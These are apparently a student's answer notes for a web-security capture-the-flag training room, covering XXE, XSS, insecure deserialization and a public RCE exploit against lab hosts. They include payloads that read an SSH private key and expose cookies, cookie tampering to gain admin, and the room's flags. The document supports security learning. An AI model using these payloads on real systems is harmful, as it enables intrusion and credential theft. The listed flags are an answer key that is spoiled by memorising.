///Task 5///
What strange text file is in the website root directory?
** ls
A: drpepper.txt
===
How many non-root/non-service/non-daemon users are there?
** uname
A: 0
===
What user is this app running as?
** whoami
A: www-data
===
What is the user's shell set as?
** cat /etc/passwd
A: /usr/sbin/nologin
===
What version of Ubuntu is running?
** lsb_release -a
A: Ubuntu 18.04.4
===
Print out the MOTD.  What favorite beverage is shown?
** cat /etc/update-motd.d/00-header (as of Google...)
A: Dr Pepper
///Task 7///
What is the flag that you found in darren's account?
A: fe86079416a21a3c99937fea8874b667
===
What is the flag that you found in arthur's account?
A: d9ac0f7db4fda460ac3edeb75d75e16e
///Task 11///
What is the name of the mentioned directory?
Go to webpage > login > inspect page > <!-- Must remember to do something better with the database than store it in /assets... --> >>
>> Navigate to: "http://10.10.229.7/assets/" 
A: /assets
===
Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
A: webapp.db
===
Use the supporting material to access the sensitive data. What is the password hash of the admin user?
Navigate to: "http://10.10.229.7/assets/" > download "webapp.db" > locate in terminal 
** sqlite3 webapp.db
** .tables
** SELECT * FROM users;
A: 6eea9b7ef19179a06954edd0f6c05ceb
===
What is the admin's plaintext password?
A: qwertyuiop (as of https://crackstation.net/)
===
Login as the admin. What is the flag?
A: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} (shown when logged in to webpage on "http://10.10.229.7/login"
///Task 16///
What is the name of the user in /etc/passwd
** /etc/passwd
A: falcon
===
Where is falcon's SSH key located?
A: /home/falcon/.ssh/id_rsa
===
What are the first 18 characters for falcon's private key?
** " <?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root> "
A: MIIEogIBAAKCAQEA7bq
///Task 18///
Look at other users notes. What is the flag?
Go to "http://10.10.139.85" > login with noot and test1234 > look at note > look at note 0
A: flag{fivefourthree} 
///Task 19///
Hack into the webapp, and find the flag!
>> Googling is needed, looked for "Pensive Notes" > GitHub page > look at default credentials
Creds: pensive:PensiveNotes
A:thm{4b9513968fd564a87b28aa1f9d672e17}
///Task 20///
Navigate to http://10.10.13.117/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
A: <script>alert(“Hello”)</script>
===
On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
>> Googling shows that "<script>alert(window.location.hostname</script>" does the trick
A: ReflectiveXss4TheWin
===
Then add a comment and see if you can insert some of your own HTML.
>> Added <title>My First HTML Document</title> (any HTML commnd can work)
A: HTML_T4gs
===
On the same page, create an alert popup box appear on the page with your document cookies.
>> Googling "html cookies" reveals that "document.cookie" is the key
>> <script>alert(document.cookie)</script>
A: W3LL_D0N3_LVL2
===
Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
>> <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
A: websites_can_be_easily_defaced_with_xss

///Task 21///
Who developed the Tomcat application?
A: The Apache Software Foundation
===
What type of attack that crashes services can be performed with insecure deserialization?
A: denial of service
///Task 25///
1st flag (cookie value)
>> Right click > Inspect element > Storage > Cookies > Select IP > session ID > Get Value (it's in base64) > decode
A: THM{good_old_base64_huh}
>> Right click > Inspect element > Storage > Cookies > userType > change to "admin" > load "Your profile" on the webpage
///Task 25///
>> Download file > execute it as of THM > add cookie as of THM > start 'netcat' >
** ls
** find / -name flag.txt 2> /dev/null (parses files, checks for "flag.txt" and outputs the lcoation)
** cat /home/cmnatic/flag.txt
A: 4a69a7ff9fd68
///Task 29///
How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
>> Google "recent unauthenticated bookstore app rce's" > click on ID47887 > download
** python3 47887.py http://10.10.1.171/
** ls
** wc -c /etc/passwd (as of the question above)
A:1611















